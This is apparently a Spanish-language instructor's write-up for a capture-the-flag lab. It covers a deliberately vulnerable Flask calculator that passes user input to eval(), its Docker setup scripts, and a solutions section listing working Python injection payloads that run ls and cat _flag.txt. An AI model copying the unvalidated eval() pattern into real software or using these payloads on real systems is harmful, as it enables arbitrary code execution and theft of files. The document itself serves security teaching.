
eval_py/
├ prepare.bash 	 # genera la flag en _flag.txt, configura variables, crea .env y _instance.
├ start.bash  # Script para iniciar el contenedor Docker mediante Docker Compose.
├ stop.bash     # Script para detener el contenedor Docker.
├ docker-compose.yml    #configuración de Docker. Define el servicio "webser" y puerto.
├ Dockerfile  	   # Dockerfile para construir la imagen del contenedor basado en python:3.9-slim.
├ requirements.txt      # Dependencias de Python (Flask).
├ app.py     # Código principal de la aplicación Flask que implementa la calculadora vulnerable.
└ templates/
 └ index.html        # Plantilla HTML que muestra la interfaz de la calculadora.



soluciones

__import__('subprocess').check_output(['cat', '_flag.txt']).decode()
    • Se importa el módulo subprocess mediante import.
    • Se usa la función check_output() para ejecutar el comando. En este caso, el comando es cat _flag.txt y se le pasa como lista de argumentos (lo que ayuda a evitar problemas de inyección si se usara correctamente).
    • check_output() devuelve la salida del comando en forma de bytes, por lo que se aplica decode() para convertirla a una cadena de texto.
__import__('subprocess').check_output(['ls']).decode()
    • Es idéntico al anterior, salvo que se ejecuta el comando ls (para listar archivos).
    • La estructura es la misma: se importa el módulo subprocess, se llama a check_output() pasando la lista de argumentos ['ls'] y luego se decodifica la salida.
__import__('os').popen('ls').read()
    • Se importa el módulo os usando import.
    • Se llama a la función popen() con el comando 'ls' (en forma de cadena, no de lista). popen() abre una tubería (pipe) para ejecutar el comando.
    • Finalmente, se usa read() para leer la salida del comando.
__import__('os').popen('cat _flag.txt').read()

__import__('os').popen('ls').read()




prepare.bash
- Se ejecuta antes de iniciar el contenedor.
    •  Determinar el nombre de la instancia (usando el nombre de la carpeta, a menos que se pase un parámetro). 
    •  Establecer el puerto a utilizar (por defecto 50080) y escribirlo en el archivo .env. 
    •  Escribir el nombre de la instancia en el archivo _instance. 
    •  Generar una flag (con un valor aleatorio) y almacenarla en el archivo _flag.txt.
    •  Prepara el entorno necesario para el funcionamiento del contenedor y del reto.
      
start.bash
    • Lee el nombre de la instancia (desde _instance) y utiliza Docker Compose para levantar el contenedor en segundo plano.
    • Se construye la imagen y se inicia el contenedor, mapeando el puerto definido en .env al puerto 80 del contenedor.
      
stop.bash
    • Detiene y elimina el contenedor Docker asociado a la instancia.
      
docker-compose.yml
    • Define el servicio "webser" que se construye a partir del Dockerfile.
    • Especifica la construcción de la imagen con el contexto actual. 
    • El mapeo del puerto (variable PORT desde .env). 
    • El montaje del directorio actual (para que cualquier cambio se refleje en el contenedor).
    • Se muestra una advertencia de versión obsoleta TENGO QUE ELIMINAR LA LINEA "version".
      
Dockerfile
    • Construye la imagen Docker para el servidor.
    • Usa la imagen base python:3.9-slim. 
    • Establece /app como directorio de trabajo. 
    • Copia requirements.txt e instala las dependencias (Flask y Werkzeug)
    • Copia el resto de los archivos del proyecto. 
    • Expone el puerto 80. 
    • Define el comando por defecto: "python app.py" para iniciar el servidor.
    • Crea el entorno de ejecución preparado para ejecutar la aplicación vulnerable.


requirements.txt
    • Lista las dependencias de Python necesarias.
Hay que fijar las versiones (Flask==2.0.3 y Werkzeug==2.0.3) porque sino en las más nuevas la función url_quote no está disponible.
    • Durante la construcción del Dockerfile, pip instala las versiones especificadas.
      
app.py
    • La parte más importante. Usa Flask para crear una interfaz web que muestra la calculadora.
La vulnerabilidad se introduce mediante el uso de eval() sin validar la entrada, haciendo posible la ejecución de código arbitrario.
      
if name == 'main': app.run(host='0.0.0.0', port=80)
    • Cuando se accede a la raíz ("/"), se muestra la plantilla index.html. 
    • Si se envía el formulario (método POST), se obtiene el valor del campo "expression". 
    • La función eval() se utiliza para evaluar la expresión. Como no se valida la entrada, un usuario puede inyectar código Python en lugar de la operación matemática esperada. 
    • En caso de éxito, se muestra el resultado; si ocurre un error, se muestra el mensaje de error.
    • La vulnerabilidad permite, por ejemplo, que un alumno inyecte: import('os').popen('cat _flag.txt').read() para leer el contenido del archivo _flag.txt y obtener la flag.

templates/index.html
    • Interfaz web para la calculadora.
    • Un formulario con un campo de texto donde se debe ingresar la operación matemática (o código) y un botón para enviar el formulario.


workflow
    • Primero se ejecuta prepare.bash: se generan los archivos de entorno (.env, _instance) y se crea el archivo _flag.txt con la flag.
    • Luego se ejecuta start.bash: Docker Compose utiliza el Dockerfile para construir la imagen, instalar las dependencias y copiar el código. Se inicia el contenedor, mapeando el puerto definido en .env (por defecto 50080) al puerto 80 del contenedor.
    • Acceder a http://127.0.0.1:50080 en un navegador donde se muestra la interfaz de la calculadora.
    • Hacer una operación en el campo "expression" y al enviar el formulario se ejecuta el código en app.py.
    • Si se ingresa una operación aritmética válida, se muestra el resultado.
    • Si se inyecta código malicioso correctamente, se ejecuta dicho código y se devuelve el resultado, sacando la falg o leyendo todos los archivos disponibles en el directorio.
    • Se ejecuta stop.bash para apagar el contenedor.

